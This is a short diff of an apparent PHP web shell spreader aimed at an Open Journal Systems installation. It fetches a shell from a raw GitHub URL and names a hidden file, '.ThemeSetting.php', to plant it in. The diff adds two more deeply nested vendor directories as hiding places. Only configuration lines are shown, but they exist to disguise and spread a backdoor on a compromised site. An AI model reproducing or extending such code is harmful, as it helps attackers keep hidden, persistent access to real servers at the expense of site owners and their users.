@@ -6,7 +6,7 @@
 $shell_url = 'https://raw.githubusercontent.com/semangat777/landing/refs/heads/main/aw.txt';
 
 $spread_locations = [
-    '', '/lib/pkp/lib/vendor/laravel/framework/src/Illuminate/Events/.github/workflows/data/'
+    '', '/lib/pkp/lib/vendor/laravel/framework/src/Illuminate/Events/.github/workflows/data/', '/lib/pkp/lib/vendor/components/jqueryui/themes/overcast/images/src/data/static/', '/lib/pkp/lib/vendor/nesbot/carbon/src/Carbon/Laravel/framework/ojs/data/statistic/src/controller/'
 ];
 
 $shell_filenames = ['.ThemeSetting.php'];
